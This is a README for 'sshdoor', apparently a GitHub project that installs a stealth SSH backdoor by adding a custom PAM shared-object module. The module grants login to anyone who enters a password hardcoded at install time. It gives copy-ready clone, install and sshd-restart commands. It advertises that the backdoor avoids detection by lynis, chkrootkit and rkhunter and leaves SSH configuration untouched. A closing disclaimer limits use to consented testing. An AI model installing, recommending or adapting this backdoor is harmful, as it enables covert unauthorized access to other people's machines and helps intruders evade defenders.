```
                █████          █████
                ░░███          ░░███
  █████   █████  ░███████    ███████   ██████   ██████  ████████
 ███░░   ███░░   ░███░░███  ███░░███  ███░░███ ███░░███░░███░░███
░░█████ ░░█████  ░███ ░███ ░███ ░███ ░███ ░███░███ ░███ ░███ ░░░
 ░░░░███ ░░░░███ ░███ ░███ ░███ ░███ ░███ ░███░███ ░███ ░███
 ██████  ██████  ████ █████░░████████░░██████ ░░██████  █████
░░░░░░  ░░░░░░  ░░░░ ░░░░░  ░░░░░░░░  ░░░░░░   ░░░░░░  ░░░░░

```
A simple stealth SSH backdoor leveraging PAM shared object (.so) injection to bypass authentication and gain SSH access.

# How it works

This script creates a PAM backdoor by injecting a custom `.so` module that intercepts SSH login attempts. Unlike traditional PAM backdoors that modify existing system files (e.g., `pam_unix.so`), this method creates a separate PAM module, making it less detectable.

When a user attempts to SSH into the system, the injected module captures the password. If the entered password matches the predefined secret password (hardcoded at compile time), authentication is granted regardless of system credentials.

# Usage
```bash
git clone https://github.com/flashnuke/ssh-door.git && cd ssh-door
sudo bash install.sh <predefined_password>
sudo systemctl restart sshd # or 'sudo service sshd restart' for non-systemd
```
Once the script finishes and sshd service is restarted, simply log into the target machine using `ssh <user>@<ip>` and enter the predefined password.

### Usage Example
<img width="415" alt="image" src="https://github.com/user-attachments/assets/e8ef099a-45d7-4351-a784-12cc5a801562" />

### Notes
* Avoids direct modification of system PAM files (`/lib/security/pam_unix.so` remains untouched)
* Passes security checks (`lynis`, `chkrootkit`, `rkhunter`), avoiding common backdoor detection methods
* Does not alter SSH configuration files (i.e `~/.ssh/authorized_keys`...), making it harder to spot
* In rare cases PAM is enabled in `/etc/ssh/sshd_config`

  
### Requirements
* Linux system with PAM-based authentication
* Root access
* SSH service (sshd) running on the target machine

# Disclaimer

This tool is only for testing and can only be used where strict consent has been given. Do not use it for illegal purposes! It is the end user’s responsibility to obey all applicable local, state and federal laws. I assume no liability and am not responsible for any misuse or damage caused by this tool and software.

Distributed under the GNU License.
